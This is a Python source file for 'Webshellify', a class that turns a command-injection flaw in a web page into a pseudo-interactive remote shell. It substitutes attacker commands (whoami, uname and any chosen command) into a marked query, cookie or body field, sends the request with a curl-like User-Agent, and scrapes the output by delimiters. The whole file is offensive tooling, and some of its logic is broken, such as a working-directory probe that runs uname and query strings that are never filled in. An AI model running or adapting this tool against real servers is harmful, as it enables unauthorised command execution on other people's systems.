"""
Webshellify is a python3 class that attempts to improve the reverse shell
experience.

The necessary request information should be specified or any functions that
fetch necessary values from the server may be passed in as well.

The location to specify where the command would be is specified by adding the
string "CMDFUZZ" in either the request body or request query. This fuzzing string
can be altered if necessary.
"""
import re
import requests as req
import urllib.parse

class Webshellify:
    content_types = [
        "text/plain",
        "application/x-www-form-urlencoded"
    ]
    """
    Usage:
    If the vulnerable webpage is at http://localhost/vuln/path, then the correct
    initialization for a Webshellify instance would be:
    `wshell = Webshellify("localhost", "/vuln/path", [options])`

    options then include:
    - debug: (boolean) Enable debugging messages, false by default
    """
    def __init__(self, host, path, **args):
        # store necessary information that will improve the webshell
        self.workdir = "/"
        self.parentdir = "/"
        self.delimiter = "output"

        self.host = host
        if("://" in self.host): # remove "http://" portion
            self.host = host.split("://")[-1]

        self.path = path
        if(self.path[0] == '/'):
            self.path = path [1:]

        self.debug = False
        if("debug" in args.keys()):
            self.debug = args["debug"]

        # necessary request information
        self.headers = {
            "User-Agent" : "curl/7.82.0",
            "Accept" : "*/*",
            "Host" : host,
            "Content-Type": "application/x-www-form-urlencoded",
        }
        self.cookies = {}
        self.method = "POST"

        self.req_body_form = ""
        self.queries = {}
        self.cmd_fuzz = "CMDFUZZ"

    """
    Generates the given command into a form that can be easily extracted from
    the response.

    This command may contain additional command calls to determine additional
    information of the current user and machine name
    """
    def __gen_command(self, command):
        return f"""
            echo '`{self.delimiter}-user`'; whoami; echo '`/{self.delimiter}-user`';
            echo '`{self.delimiter}-host`'; uname -n; echo '`/{self.delimiter}-host`'
            echo '`{self.delimiter}-wd`'; uname -n; echo '`/{self.delimiter}-wd`'
            echo '`{self.delimiter}`'; {command}; echo '`/{self.delimiter}`'
            """

    """
    Extracts the output from the command call from the page results

    this will return the current user, hostname and command response.
    """
    def __extract_output(self, raw):
        user_regex = f"`{self.delimiter}-user`\n((.*\n)*)`\/{self.delimiter}-user`"
        host_regex = f"`{self.delimiter}-host`\n((.*\n)*)`\/{self.delimiter}-host`"
        wd_regex = f"`{self.delimiter}-wd`\n((.*\n)*)`\/{self.delimiter}-wd`"
        output_regex = f"`{self.delimiter}`\n((.*\n)*)`\/{self.delimiter}`"
        user_re = re.compile(user_regex)
        host_re = re.compile(host_regex)
        wd_re = re.compile(wd_regex)
        output_re = re.compile(output_regex)
        if(self.debug):
            print(f"""[debug] in funct `__extract_output`
raw: {raw}
user regex: {user_regex}
match: {user_re.findall(raw)}
host regex: {host_regex}
match: {host_re.findall(raw)}
host regex: {wd_regex}
match: {wd_re.findall(raw)}
output regex: {output_regex}
match: {output_re.findall(raw)}""")
        user = user_re.findall(raw)[0][0]
        host = host_re.findall(raw)[0][0]
        workdir = wd_re.findall(raw)[0][0]
        output = output_re.findall(raw)[0][0]
        return user, host, output

    """
    Sends an individual command in isolation to the host and path initialized.

    This requires a preset location for the command to be inserted into the
    request. This requires the command fuzz keyword to be placed in either a
    query paramter or the request body

    This function will also return the name of the host, name of the current
    user and the output of the previous command
    """
    def send_command(self, command):
        cmd = self.__gen_command(command)
        # generate query
        query_str = "?"
        for key, value in enumerate(self.queries):
            if(self.cmd_fuzz in value):
                value = value.replace(self.cmd_fuzz, cmd)
            query_str += "{key}={value}&"
        query_str = query_str[:-1] # remove the last character (either '?' or '&')

        # generate cookies
        cookie_dict = {}
        for key, value in self.cookies.items():
            if(self.cmd_fuzz in value):
                value = value.replace(self.cmd_fuzz, cmd)
            cookie_dict[key] = value

        # generate body (if it is neither a GET nor a HEAD request)
        body_str = ""
        if(self.method.upper() != "GET" and self.method.upper() != "HEAD"):
            body_str = self.req_body_form
            if(self.cmd_fuzz in body_str):
                body_str = body_str.replace(self.cmd_fuzz, cmd)

        # generate url
        url = f"http://{self.host}/{self.path}{query_str}"

        # send request with payload
        resp = req.request(
                self.method.upper(),
                url,
                cookies=cookie_dict,
                data=body_str,
                headers=self.headers)

        if(self.debug):
            print(f"""
[debug] in funct `send_command`
sent
----
method: {self.method.upper()}
url: {url}
cookies: {cookie_dict}
data: {body_str}
headers: {self.headers}
"""
            )

        return self.__extract_output(resp.text)
